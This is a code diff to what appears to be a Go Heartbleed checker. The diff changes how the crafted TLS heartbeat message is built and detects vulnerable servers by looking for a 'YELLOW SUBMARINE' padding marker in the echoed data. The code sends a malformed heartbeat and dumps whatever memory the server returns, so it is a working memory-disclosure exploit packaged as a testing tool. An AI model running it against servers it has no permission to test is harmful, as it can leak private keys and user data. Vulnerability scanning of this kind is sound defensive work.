@@ -11,6 +11,8 @@ import (
 
 var ErrPayloadNotFound = errors.New("heartbleed: payload not found")
 
+var padding = []byte("YELLOW SUBMARINE")
+
 // struct {
 //    uint8  type;
 //    uint16 payload_length;
@@ -27,21 +29,21 @@ func buildEvilMessage(payload []byte) []byte {
 	if err != nil {
 		panic(err)
 	}
-	_, err = buf.Write([]byte("heartbleed.filippo.io"))
+	_, err = buf.Write(payload)
 	if err != nil {
 		panic(err)
 	}
-	_, err = buf.Write(payload)
+	_, err = buf.Write(padding)
 	if err != nil {
 		panic(err)
 	}
 	return buf.Bytes()
 }
 
-func heartbleedCheck(conn *tls.Conn, payload []byte, buf *bytes.Buffer, vuln chan bool) func([]byte) {
+func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
 	return func(data []byte) {
 		spew.Fdump(buf, data)
-		if bytes.Index(data, payload) == -1 {
+		if bytes.Index(data, padding) == -1 {
 			vuln <- false
 		} else {
 			vuln <- true
@@ -58,7 +60,7 @@ func Heartbleed(host string, payload []byte) (out []byte, err error) {
 
 	var vuln = make(chan bool, 1)
 	buf := new(bytes.Buffer)
-	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, payload, buf, vuln))
+	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))
 
 	go func() {
 		conn.Read(nil)
